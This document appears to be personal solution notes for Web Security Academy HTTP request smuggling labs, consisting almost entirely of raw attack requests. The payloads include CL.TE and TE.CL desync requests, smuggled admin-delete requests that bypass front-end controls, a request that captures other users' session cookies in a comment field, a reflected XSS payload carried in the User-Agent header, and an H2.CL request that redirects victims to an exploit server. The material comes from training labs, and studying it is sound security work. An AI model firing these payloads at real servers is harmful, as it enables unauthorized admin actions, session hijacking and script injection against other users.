### HTTP request smuggling, basic CL.TE vulnerability
```http
POST / HTTP/1.1
Host: 0aa5006404ff4af7808d851000b80050.web-security-academy.net
Cookie: session=Kk8s672RLE4Ez2zYWTOuXTZ5DXVdtdUM
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 8
Transfer-Encoding: chunked

0


G
```

### HTTP request smuggling, basic TE.CL vulnerability
```http
POST / HTTP/1.1
Host: 0a1800e10453781780123f050024005f.web-security-academy.net
Cookie: session=VLi94a6nr97fAC1uGcmNGrMv6WCSlPPG
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Length: 3
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### HTTP request smuggling, obfuscating the TE header
```http
POST / HTTP/1.1
Host: 0ad8006804b1cb2281601b0700de003e.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Priority: u=0, i
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
```http
POST / HTTP/1.1
Host: 0adf00c903928b82807a5d3d003e00dc.web-security-academy.net
Cookie: session=Lr5X7DamZpmkyQBmCxdLfmgxGv1RM6k4
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
```http
POST / HTTP/1.1
Host: 0add00ce03e6cbd8cdbde34f000a000a.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked

5f
POST /40s4 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
```http
POST / HTTP/1.1
Host: 0abc007203ea874d80010d9a00b4000c.web-security-academy.net
Cookie: session=tZPJhGFTkc14ZNneoaXvhXBHSc3zYjO8
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 92
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 10


x=
```

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
```http
POST / HTTP/1.1
Host: 0abf006e049a127b80b6cb4800240046.web-security-academy.net
Cookie: session=opRHlKVRK5pI7gDFvoz6iS70JKd4CpZj
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 4
Transfer-Encoding: chunked

66
POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
X-Ignore: X
Content-Length: 15


x=1
0


```


### Exploiting HTTP request smuggling to reveal front-end request rewriting
```http
POST / HTTP/1.1
Host: 0ae700dc04869cf8810d6b9700510068.web-security-academy.net
Cookie: session=uDkY4ntORa7dTJpfL8ixoAy1o19HQi4b
Content-Length: 105
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0


POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400


search=
```

```http
POST / HTTP/1.1
Host: 0ae700dc04869cf8810d6b9700510068.web-security-academy.net
Cookie: session=uDkY4ntORa7dTJpfL8ixoAy1o19HQi4b
Content-Length: 168
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0


GET /admin/delete?username=carlos HTTP/1.1
X-GwqAhd-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

### Exploiting HTTP request smuggling to capture other users' requests
```http
POST / HTTP/1.1
Host: 0a3400e304a00b5a81a40e6f00d90060.web-security-academy.net
Cookie: session=6MYApPH4i8fhaywLuQXAUhOO1ynYPx7A
Transfer-Encoding: chunked
Content-Length: 284

0


POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=6MYApPH4i8fhaywLuQXAUhOO1ynYPx7A
Content-Length: 950

csrf=vEBWClscyPS08FSxfQQaE6SHKWiMYQCO&postId=7&name=asddaaa&email=fdsaf%40gmail.com&website=https%3A%2F%2Fgoogle.com&comment=
```

### Exploiting HTTP request smuggling to deliver reflected XSS
**Payload** :
```http
POST / HTTP/1.1
Host: 0aff00f503a4570484681fcf006b00b7.web-security-academy.net
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 87
Transfer-Encoding: chunked

0

GET /post?postId=7 HTTP/1.1
User-Agent: "><script>alert(1);</script>
X-Ignore: X
```

### H2.CL request smuggling
**Payload** :
```http
POST / HTTP/2
Host: 0a1c00e30400f24280ecc1d7009e00fa.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0a3b00b60445f2ce807ec0ab01b80097.exploit-server.net
Content-Length: 5

x=1
```

